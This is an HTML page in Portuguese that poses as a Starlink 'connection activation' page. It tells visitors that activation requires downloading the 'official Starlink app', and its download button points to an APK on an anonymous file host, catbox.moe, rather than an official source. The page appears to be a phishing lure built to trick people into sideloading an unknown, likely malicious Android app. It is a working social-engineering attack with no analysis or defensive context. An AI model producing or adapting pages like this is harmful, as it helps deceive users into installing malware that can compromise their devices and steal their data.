<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Starlink - Ativação de Conexão</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #0b0f19;
      color: #ffffff;
      margin: 0;
      padding: 0;
      text-align: center;
    }
    .container {
      max-width: 600px;
      margin: 40px auto;
      background-color: #1c2331;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
    }
    img.logo {
      max-width: 100%;
      height: auto;
      border-radius: 8px;
      margin-bottom: 20px;
    }
    h1 {
      color: #00aaff;
      margin-bottom: 20px;
    }
    .download-btn {
      background-color: #00aaff;
      color: #fff;
      border: none;
      padding: 15px 30px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s;
      text-decoration: none;
      display: inline-block;
      margin-top: 30px;
    }
    .download-btn:hover {
      background-color: #008fcc;
    }
    .info-text {
      font-size: 16px;
      line-height: 1.6;
      margin-top: 20px;
    }
    .important {
      color: #ffcc00;
      font-weight: bold;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://super.abril.com.br/wp-content/uploads/2022/12/SI_446_novas_starlink.jpg?quality=70&strip=info&w=1024&h=682&crop=1" alt="Starlink Satélites" />

    <h1>Conexão Starlink</h1>
    <p>Sua conexão está <strong>prestes a ser ativada</strong>.</p>
    
    <div class="info-text">
      <p>Para continuar, é <strong>necessário baixar o aplicativo oficial da Starlink</strong> para validar e ativar sua conexão.</p>
    </div>

    <a class="download-btn" href="https://files.catbox.moe/klgp03.apk" download>Baixe o app da Starlink</a>

    <p class="important">Após o download, instale o aplicativo para finalizar a ativação.</p>
  </div>
</body>
</html>
